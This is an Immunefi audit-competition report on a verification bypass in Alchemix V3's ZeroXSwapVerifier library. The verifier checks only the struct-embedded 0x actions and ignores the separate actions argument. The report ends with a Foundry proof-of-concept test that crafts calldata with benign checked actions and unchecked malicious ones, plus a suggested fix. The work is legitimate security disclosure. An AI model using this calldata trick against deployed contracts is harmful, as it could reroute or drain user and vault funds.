# 58604 sc low verification bypass in verifyexecutemetatxncalldata enables arbitrary 0x actions to pass checks and execute in the zeroxswapverifier sol contract

**Submitted on Nov 3rd 2025 at 14:00:30 UTC by @Kissiahmyo for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58604
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

The `ZeroXSwapVerifier.sol` library’s `_verifyExecuteMetaTxnCalldata` decodes both a `SlippageAndActions` struct and a separate `bytes[] actions` argument, but it verifies only the struct’s embedded `actions`. If the actual 0x Settler execution reads the separate `actions` argument (a common ABI style), a malicious caller can craft calldata where benign actions are placed in the struct while harmful actions are placed in the second parameter `bytes[] actions`. The verifier returns success, but settlement executes the harmful actions, bypassing whitelists, slippage limits, and recipient restrictions. This creates a practical path to reroute assets or violate risk controls in production.

## Vulnerability Details

**Context and goal**: `verifySwapCalldata()` -> `decodeAndVerifyActions()` -> `_verifyExecuteMetaTxnCalldata()`

* `ZeroXSwapVerifier` is designed to statically validate 0x Settler calldata for two entry points, `execute(SlippageAndActions, bytes[])` and `executeMetaTxn(SlippageAndActions, bytes[], address, bytes)`. It enforces token whitelists, slippage bounds, allowed action types, and target token constraints before execution.
* The top-level entry `verifySwapCalldata` checks the function selector, then delegates to `decodeAndVerifyActions` which routes to `_verifyExecuteCalldata` or `_verifyExecuteMetaTxnCalldata` based on selector.

**Vulnerable function and code:** In `src/utils/ZeroXSwapVerifier.sol`, `_verifyExecuteMetaTxnCalldata` decodes `(SlippageAndActions, bytes[], address, bytes)` but disregards the `bytes[]` parameter and uses only `saa.actions` for verification:

[ZeroXSwapVerifier.sol::verifyExecuteMetaTxnCalldata#L140](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L140)

```solidity
    function _verifyExecuteMetaTxnCalldata(bytes calldata data, address owner, address targetToken, uint256 maxSlippageBps) internal view {
        // Decode parameters: (SlippageAndActions, bytes[], address, bytes)
        (SlippageAndActions memory saa, , , ) = abi.decode(data, (SlippageAndActions, bytes[], address, bytes));
        _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
    }
```

This creates a semantic mismatch: the verifier inspects the struct’s `actions`, while the actual Settler contract may execute the separate `bytes[] actions` argument. If these two are not guaranteed identical at runtime, verification can be trivially bypassed.

## Impact Details

Gate bypass of risk controls

* Many 0x integration ABIs use a struct for metadata (`recipient`, `buyToken`, `minAmountOut`) and pass `actions` as a separate array argument that is executed. The current verifier trusts `saa.actions` and ignores the second `actions` parameter.
* An attacker can: Construct calldata with “safe-looking” actions embedded in `SlippageAndActions.actions` to satisfy verification rules. Place malicious or policy-breaking actions in the second `bytes[] actions` parameter that the Settler will actually execute. Pass `verifySwapCalldata` and proceed to execution in the same transaction, achieving “verified but harmful” behavior.

Asset misdirection and loss:

* Integrations commonly use `ZeroXSwapVerifier.verifySwapCalldata(...)` as a pre-execution gate before calling 0x Settler. With this bypass, “verify then execute” can lead to asset redirection, draining vault/user funds or performing out-of-policy trades.
* Severity is high where this library gates treasury, vault strategies, or user swaps; a single transaction can pass verification and still execute malicious actions, enabling immediate theft or policy violations.

Additional notes that exacerbate risk:

* The function includes a `TODO shall we also verify saa.buyToken ?`, indicating important fields like `buyToken` might be unverified. This weakens policy enforcement further (e.g., wrong output token).
* The library does not assert consistency between the struct `actions` and the separate `actions` parameter, nor does it canonicalize or cross-check intended recipients against actual execution paths.

## Recommendation

Validate the exact actions array that will be executed and eliminate ambiguity between duplicated parameters. Bind verification to the execution payload by enforcing equality between the struct’s saa.actions and the separate bytes\[] actions argument, or remove one source entirely.

## References

File: `src/utils/ZeroXSwapVerifier.sol`

* `_verifyExecuteMetaTxnCalldata`: decodes `(SlippageAndActions, bytes[], address, bytes)` but verifies only `saa.actions`.

Entry points: `verifySwapCalldata()` -> `decodeAndVerifyActions()` -> `_verifyExecuteMetaTxnCalldata()`

* `verifySwapCalldata(bytes calldata, address owner, address targetToken, uint256 maxSlippageBps)`
* `decodeAndVerifyActions(bytes calldata, address owner, address targetToken, uint256 maxSlippageBps)`

[ZeroXSwapVerifier.sol::verifyExecuteMetaTxnCalldata#L140](https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L140)

## Proof of Concept

## Proof of Concept

The PoC `test_poc_executeMetaTxn_verification_bypass` can be added at the end of the `ZeroXSwapVerifier.t.sol` test file to successfully demonstrate the verification bypass vulnerability.

The PoC could be successfully added to the end of `ZeroXSwapVerifier.t.sol` . The test `test_poc_executeMetaTxn_verification_bypass()` demonstrates the verification bypass vulnerability by:

* Creating benign actions in the `SlippageAndActions` struct that pass verification (correct token, acceptable slippage) Creating malicious actions in the separate `bytes[]` parameter that would normally fail verification (wrong token, excessive slippage, suspicious recipient)
* Showing that verification passes because the verifier only checks `saa.actions` (the benign ones) while ignoring the bytes\[] actions parameter that would actually be executed by the 0x Settler
* Proving the bypass works by demonstrating that if the malicious actions were placed directly in the struct, verification would correctly fail

The test passes, confirming that the vulnerability exists and can be exploited to bypass token validation, slippage limits, and recipient restrictions. This PoC provides concrete evidence of the security flaw described in the bug report.

```bash
Ran 1 test for src/test/ZeroXSwapVerifier.t.sol:ZeroXSwapVerifierTest
[PASS] test_poc_executeMetaTxn_verification_bypass() (gas: 743588)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 17.97ms (3.60ms CPU time)
```

```solidity
// PoC: Verification bypass in _verifyExecuteMetaTxnCalldata
    // Demonstrates how malicious actions in the second parameter can bypass verification
    function test_poc_executeMetaTxn_verification_bypass() public {
        // Create a benign action for the struct that will pass verification
        bytes memory benignAction = abi.encodeWithSelector(
            BASIC_SELL_TO_POOL,
            address(token), // Correct token
            500,            // 5% slippage - within limits
            spender,
            0,
            ""
        );
        
        // Create a malicious action for the second parameter that would normally fail
        TestERC20 maliciousToken = new TestERC20(1000e18, 18);
        bytes memory maliciousAction = abi.encodeWithSelector(
            BASIC_SELL_TO_POOL,
            address(maliciousToken), // Wrong token - should fail verification
            2000,                    // 20% slippage - exceeds maxSlippageBps
            address(0xdead),         // Suspicious recipient
            0,
            ""
        );
        
        // Create SlippageAndActions struct with benign action
        ZeroXSwapVerifier.SlippageAndActions memory saa = ZeroXSwapVerifier.SlippageAndActions({
            recipient: spender,
            buyToken: address(0),
            minAmountOut: 0,
            actions: new bytes[](1)
        });
        saa.actions[0] = benignAction; // Verifier will check this
        
        // Create malicious actions array for second parameter
        bytes[] memory maliciousActions = new bytes[](1);
        maliciousActions[0] = maliciousAction; // Settler would execute this
        
        // Build executeMetaTxn calldata with mismatched actions
        bytes memory maliciousCalldata = abi.encodeWithSelector(
            EXECUTE_META_TXN_SELECTOR,
            saa,                // Contains benign action
            maliciousActions,   // Contains malicious action that would be executed
            address(0),
            ""
        );
        
        // Verification should pass because it only checks saa.actions (benign)
        // But in reality, the Settler would execute maliciousActions (harmful)
        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            maliciousCalldata,
            owner,
            address(token),     // Expecting this token
            1000               // 10% max slippage
        );
        
        // This assertion demonstrates the vulnerability:
        // Verification passes even though the actual executed actions would violate policy
        assertTrue(verified, "PoC: Verification bypass - malicious actions pass verification");
        
        // Additional verification: if we tried to verify the malicious action directly,
        // it would fail (proving the bypass works)
        ZeroXSwapVerifier.SlippageAndActions memory directMaliciousStruct = ZeroXSwapVerifier.SlippageAndActions({
            recipient: address(0xdead),
            buyToken: address(0),
            minAmountOut: 0,
            actions: new bytes[](1)
        });
        directMaliciousStruct.actions[0] = maliciousAction;
        
        bytes memory directMaliciousCalldata = abi.encodeWithSelector(
            EXECUTE_META_TXN_SELECTOR,
            directMaliciousStruct,
            new bytes[](0),
            address(0),
            ""
        );
        
        // This should fail verification (wrong token)
        vm.expectRevert(bytes("IT"));
        ZeroXSwapVerifier.verifySwapCalldata(
            directMaliciousCalldata,
            owner,
            address(token),
            1000
        );
    }
```
